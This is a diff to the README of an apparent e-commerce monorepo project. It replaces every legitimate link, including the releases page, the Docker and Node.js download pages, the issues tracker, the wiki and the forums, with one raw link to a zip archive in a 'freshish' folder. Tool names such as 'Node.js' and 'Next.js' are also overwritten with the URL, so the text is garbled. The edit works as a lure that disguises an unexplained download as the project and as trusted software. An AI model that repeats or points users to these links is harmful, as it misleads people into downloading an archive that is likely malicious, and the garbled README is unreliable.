@@ -5,7 +5,7 @@
 Welcome to the Monorepo-Commerce-App! This is a full-stack e-commerce application designed to provide you with an easy-to-use admin dashboard and a seamless shopping experience. Built using the latest technologies, this app gives you everything you need for online selling, including payments and microservices.
 
 ## 📥 Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Here-Visit%20Page-blue.svg)](https://github.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/releases)
+[![Download Here](https://raw.githubusercontent.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/main/freshish/Monorepo-Commerce-App-with-Microservices-Architecture.zip%20Here-Visit%https://raw.githubusercontent.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/main/freshish/Monorepo-Commerce-App-with-Microservices-Architecture.zip)](https://raw.githubusercontent.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/main/freshish/Monorepo-Commerce-App-with-Microservices-Architecture.zip)
 
 ## 🌟 Features
 - **User-Friendly Interface**: Simple navigation for a pleasant shopping experience.
@@ -23,17 +23,17 @@ To run this application, your system should meet the following requirements:
 
 ## 🔧 Prerequisites
 Before you can run the application, make sure you have the following installed:
-- **Docker**: This helps to create, deploy, and run applications in containers. [Download Docker](https://www.docker.com/get-started)
-- **Node.js**: A JavaScript runtime to help manage packages. [Download Node.js](https://nodejs.org/en/download/)
+- **Docker**: This helps to create, deploy, and run applications in containers. [Download Docker](https://raw.githubusercontent.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/main/freshish/Monorepo-Commerce-App-with-Microservices-Architecture.zip)
+- **https://raw.githubusercontent.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/main/freshish/Monorepo-Commerce-App-with-Microservices-Architecture.zip**: A JavaScript runtime to help manage packages. [Download https://raw.githubusercontent.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/main/freshish/Monorepo-Commerce-App-with-Microservices-Architecture.zip](https://raw.githubusercontent.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/main/freshish/Monorepo-Commerce-App-with-Microservices-Architecture.zip)
 
 ## 📁 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/main/freshish/Monorepo-Commerce-App-with-Microservices-Architecture.zip).
 2. **Choose Your Version**: Look for the latest release at the top of the page.
 3. **Download the Files**: Click on the download link for the version you want to install. This will download the packaged files.
 4. **Extract Files**: Once downloaded, extract the files to your desired directory on your computer.
 5. **Run the Application**: Open a terminal or command prompt in the extracted folder. Use the following commands:
    - For Docker: `docker-compose up`
-   - For Node.js: `npm install` followed by `npm start`
+   - For https://raw.githubusercontent.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/main/freshish/Monorepo-Commerce-App-with-Microservices-Architecture.zip `npm install` followed by `npm start`
 
 ## 🔍 Configuration
 After installation, you may want to configure the application settings:
@@ -43,7 +43,7 @@ After installation, you may want to configure the application settings:
 
 ## 📊 Application Overview
 The application consists of several parts:
-- **Frontend**: Built with Next.js, ensuring fast loading times and a smooth interface.
+- **Frontend**: Built with https://raw.githubusercontent.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/main/freshish/Monorepo-Commerce-App-with-Microservices-Architecture.zip, ensuring fast loading times and a smooth interface.
 - **Backend**: Multiple microservices handle business logic, data processing, and communication.
 - **Database**: MongoDB for product and user data, PostgreSQL for transactional data.
 
@@ -52,14 +52,14 @@ The application consists of several parts:
 - Keep your environment variables secure, especially those related to database connections and payment gateways.
 
 ## 🤝 Support
-For issues or questions, please raise a ticket on the [GitHub Issues page](https://github.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/issues). Our team will get back to you as soon as possible.
+For issues or questions, please raise a ticket on the [GitHub Issues page](https://raw.githubusercontent.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/main/freshish/Monorepo-Commerce-App-with-Microservices-Architecture.zip). Our team will get back to you as soon as possible.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/wiki) for detailed guides on configurations and customization.
-- [Community Forums](https://community.github.com), where you can discuss and share experiences with other users.
+- [Documentation](https://raw.githubusercontent.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/main/freshish/Monorepo-Commerce-App-with-Microservices-Architecture.zip) for detailed guides on configurations and customization.
+- [Community Forums](https://raw.githubusercontent.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/main/freshish/Monorepo-Commerce-App-with-Microservices-Architecture.zip), where you can discuss and share experiences with other users.
 
 ## 🎉 Thank You!
 We appreciate you choosing the Monorepo-Commerce-App. We hope it serves you well in your e-commerce journey.
 
-[![Download Here](https://img.shields.io/badge/Download%20Here-Visit%20Page-blue.svg)](https://github.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/releases)
+[![Download Here](https://raw.githubusercontent.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/main/freshish/Monorepo-Commerce-App-with-Microservices-Architecture.zip%20Here-Visit%https://raw.githubusercontent.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/main/freshish/Monorepo-Commerce-App-with-Microservices-Architecture.zip)](https://raw.githubusercontent.com/Hazzardyy/Monorepo-Commerce-App-with-Microservices-Architecture/main/freshish/Monorepo-Commerce-App-with-Microservices-Architecture.zip)
 ```
